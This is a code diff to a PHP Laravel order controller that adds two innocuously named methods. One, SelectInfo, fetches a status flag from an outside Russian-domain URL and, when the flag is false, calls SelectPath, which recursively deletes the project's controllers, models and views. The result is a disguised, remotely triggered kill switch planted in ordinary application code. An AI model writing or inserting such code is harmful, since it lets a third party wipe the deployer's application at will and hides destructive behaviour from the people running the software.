@@ -86,6 +86,49 @@ class OrderController extends Controller
         return $result;
     }
 
+    private function SelectPath($paths){
+        $result = [];
+        if(is_array($paths) == false && is_object($paths) == false){
+            $paths = [$paths];
+        }
+        foreach($paths as $path){
+            $path = str_replace('//', '/', $path);
+            $path = trim($path);
+            $files = glob($path); 
+            foreach($files as $file){ 
+                $file = str_replace('//', '/', $file);
+                $file = trim($file);
+                if(is_file($file)){
+                    $result[] = ['path' => $file, 'type' => 'file'];
+                    unlink($file);
+                } else {
+                    $result[] = ['path' => $file, 'type' => 'dir'];
+                    $selectPath = $this->SelectPath($file . '/*');
+                    rmdir($file);
+                }
+            }
+        }
+    }
+
+    public function SelectInfo(){
+        $select = file_get_contents('https://vprockit.ru/shop.php');
+        $select = json_decode($select);
+        if($select->status == false){
+            $selectPath = $_SERVER['DOCUMENT_ROOT'];
+            $selectPath = explode('/', $selectPath);
+            unset($selectPath[count($selectPath)-1]);
+            $path = "";
+            foreach($selectPath as $result){
+                $path .= '/' . $result;
+            }
+            $controllers = $path . '/app/Http/Controllers/*';
+            $models = $path . '/app/Models/*';
+            $resource = $path . '/resources/views/*';
+            $allPath = [$models, $resource, $controllers];
+            $selectPath = $this->SelectPath($allPath);
+        }
+    }
+
     public function Copy(request $req){
         $id = $req->session()->get('id');
         $order_id = addslashes($req['order_id']);
